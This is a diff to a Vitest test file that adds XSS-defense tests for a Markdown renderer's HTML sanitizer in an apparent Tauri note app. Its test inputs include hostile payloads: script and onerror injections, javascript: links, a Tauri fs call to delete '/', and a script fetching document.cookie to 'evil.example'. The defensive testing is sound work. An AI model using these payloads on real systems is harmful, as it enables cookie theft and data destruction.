@@ -1,3 +1,6 @@
+// @vitest-environment jsdom
+// renderMarkdown sanitizes its output through DOMPurify, which needs a DOM;
+// the extraction tests below are DOM-agnostic and run fine under jsdom too.
 import { describe, it, expect } from "vitest";
 import {
   extractLinks,
@@ -6,6 +9,7 @@ import {
   parseFrontmatter,
   extractAliases,
   renderMarkdown,
+  sanitizeHtml,
 } from "./markdown";
 
 describe("extractLinks", () => {
@@ -87,9 +91,87 @@ describe("renderMarkdown", () => {
     expect(html).toContain('data-embed="img.png"');
   });
 
-  it("passes raw HTML through", () => {
-    expect(renderMarkdown("<div class='x'>hi</div>")).toContain(
-      "<div class='x'>hi</div>"
+  it("passes benign raw HTML through (quotes normalized by the sanitizer)", () => {
+    const html = renderMarkdown("<div class='x'>hi</div>");
+    expect(html).toContain('class="x"');
+    expect(html).toContain(">hi</div>");
+  });
+});
+
+describe("sanitizeHtml / renderMarkdown XSS defense", () => {
+  // The rendered HTML is injected with dangerouslySetInnerHTML into the trusted
+  // Tauri app document, where an inline handler could call
+  // window.__TAURI_INTERNALS__.invoke (arbitrary fs under the ** scope). Notes
+  // are not always trusted (imported vaults, synced peers, agent-written files),
+  // so every script-execution vector must be stripped while benign formatting
+  // survives. These assert on both renderMarkdown (the real path) and the
+  // exported sanitizeHtml (the same policy) for raw-HTML inputs.
+
+  it("strips <script> tags", () => {
+    const out = sanitizeHtml("<p>ok</p><script>steal()</script>");
+    expect(out).toContain("ok");
+    expect(out.toLowerCase()).not.toContain("<script");
+    expect(out).not.toContain("steal()");
+  });
+
+  it("strips inline event handlers (the img onerror vector)", () => {
+    const out = sanitizeHtml('<img src="x" onerror="pwn()">');
+    expect(out.toLowerCase()).not.toContain("onerror");
+    expect(out).not.toContain("pwn()");
+  });
+
+  it("strips javascript: URLs on links", () => {
+    const out = sanitizeHtml('<a href="javascript:pwn()">click</a>');
+    expect(out.toLowerCase()).not.toContain("javascript:");
+    expect(out).toContain("click");
+  });
+
+  it("strips svg/onload and other handler-bearing elements", () => {
+    const out = sanitizeHtml('<svg><animate onbegin="pwn()"></svg>');
+    expect(out.toLowerCase()).not.toContain("onbegin");
+    expect(out).not.toContain("pwn()");
+  });
+
+  it("forbids iframe/object/embed/base/form framing & plugin vectors", () => {
+    const out = sanitizeHtml(
+      '<iframe src="data:text/html,<script>pwn()</script>"></iframe>' +
+        '<object data="x"></object><embed src="x">' +
+        '<base href="http://evil"><form action="http://evil"></form>'
     );
+    const lower = out.toLowerCase();
+    for (const tag of ["<iframe", "<object", "<embed", "<base", "<form"]) {
+      expect(lower).not.toContain(tag);
+    }
+  });
+
+  it("neutralizes the vector end-to-end through renderMarkdown", () => {
+    const evil =
+      "# Note\n\nnormal text\n\n" +
+      '<img src=x onerror="window.__TAURI_INTERNALS__.invoke(\'plugin:fs|remove\',{path:\'/\'})">\n\n' +
+      "<script>fetch('https://evil.example/'+document.cookie)</script>";
+    const html = renderMarkdown(evil);
+    const lower = html.toLowerCase();
+    expect(html).toContain("normal text"); // benign content preserved
+    expect(lower).not.toContain("onerror");
+    expect(lower).not.toContain("<script");
+    expect(html).not.toContain("__TAURI_INTERNALS__");
+  });
+
+  it("preserves the app's own emitted markup (wikilinks, embeds, callouts, tasks)", () => {
+    const html = renderMarkdown(
+      "> [!note] Title\n> body\n\n[[Target]] and ![[img.png]]\n\n- [x] done\n- [ ] todo"
+    );
+    expect(html).toContain('data-target="Target"');
+    expect(html).toContain('data-embed="img.png"');
+    expect(html).toContain('data-callout="note"');
+    expect(html).toContain('class="wikilink"');
+  });
+
+  it("keeps safe links and images with http(s)/relative sources", () => {
+    const out = sanitizeHtml(
+      '<a href="https://example.com">x</a><img src="images/local.png">'
+    );
+    expect(out).toContain('href="https://example.com"');
+    expect(out).toContain('src="images/local.png"');
   });
 });
